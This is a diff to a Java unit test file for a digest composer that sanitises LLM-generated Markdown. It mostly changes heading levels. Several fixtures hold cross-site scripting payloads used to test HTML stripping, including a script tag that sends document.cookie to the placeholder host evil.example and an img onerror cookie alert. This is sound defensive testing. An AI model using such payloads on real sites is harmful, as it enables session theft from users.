@@ -64,10 +64,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro.
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -83,10 +83,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro.
 
-        ## Spring Boot 4 Released
+        ### Spring Boot 4 Released
         Rewritten prose, but the link is gone.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -124,10 +124,10 @@ class DigestComposerTest {
         # This Week's Digest
         A flowing intro.
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -140,14 +140,14 @@ class DigestComposerTest {
   }
 
   @Test
-  void usesSynthesisWithOnlyDoubleHashHeadings() {
+  void usesSynthesisWithOnlySectionLevelHeadings() {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro.
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -155,8 +155,8 @@ class DigestComposerTest {
 
     assertThat(result).contains("A flowing intro.");
     assertThat(result).contains("Rewritten prose about Spring Boot.");
-    assertThat(result).contains("## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)");
-    assertThat(result).contains("## [Postgres 19 Ships](https://pg.org/pg19)");
+    assertThat(result).contains("### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)");
+    assertThat(result).contains("### [Postgres 19 Ships](https://pg.org/pg19)");
   }
 
   @Test
@@ -164,10 +164,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro. <script>fetch('https://evil.example/'+document.cookie)</script>
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -183,10 +183,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro. <img src=x onerror=alert(document.cookie)>
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -202,10 +202,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro noting that 5<10 and that a < b in the benchmark.
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -223,7 +223,7 @@ class DigestComposerTest {
     // HTML, compose() strips defensively rather than trusting that upstream
     // guard alone.
     when(assistantMessage.getContent()).thenReturn("""
-        ## Sketchy Article
+        ### Sketchy Article
         Rewritten prose, but the link is gone.
         """);
 
@@ -243,10 +243,10 @@ class DigestComposerTest {
         echo hello
         ```
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -266,10 +266,10 @@ class DigestComposerTest {
         value = 42
         ```
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
@@ -289,7 +289,7 @@ class DigestComposerTest {
     String result = composer.compose(List.of(SECTION_WITH_NESTED_HTML_IN_BODY));
 
     assertThat(result).isEqualTo(
-        "## [Sketchy Body Article](https://sketchy.example/body)\n\n"
+        "### [Sketchy Body Article](https://sketchy.example/body)\n\n"
             + "Intro text. alert(1) Trailing text.");
     assertThat(result).doesNotContain("<").doesNotContain(">");
   }
@@ -302,7 +302,7 @@ class DigestComposerTest {
     String result = composer.compose(List.of(SECTION_WITH_NESTED_HTML_IN_TITLE));
 
     assertThat(result).isEqualTo(
-        "## [alert(1)](https://sketchy.example/title)\n\nOrdinary body text.");
+        "### [alert(1)](https://sketchy.example/title)\n\nOrdinary body text.");
     assertThat(result).doesNotContain("<").doesNotContain(">");
   }
 
@@ -320,7 +320,7 @@ class DigestComposerTest {
     String result = composer.compose(List.of(prose));
 
     assertThat(result).isEqualTo(
-        "## [Benchmark Results](https://bench.example/a)\n\n"
+        "### [Benchmark Results](https://bench.example/a)\n\n"
             + "The results show that if latency < threshold and throughput "
             + "> baseline, the service is healthy.");
   }
@@ -330,10 +330,10 @@ class DigestComposerTest {
     when(assistantMessage.getContent()).thenReturn("""
         A flowing intro. <SCRIPT>alert(document.cookie)</SCRIPT>
 
-        ## [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
+        ### [Spring Boot 4 Released](https://infoq.com/spring-boot-4)
         Rewritten prose about Spring Boot.
 
-        ## [Postgres 19 Ships](https://pg.org/pg19)
+        ### [Postgres 19 Ships](https://pg.org/pg19)
         Rewritten prose about Postgres.
         """);
 
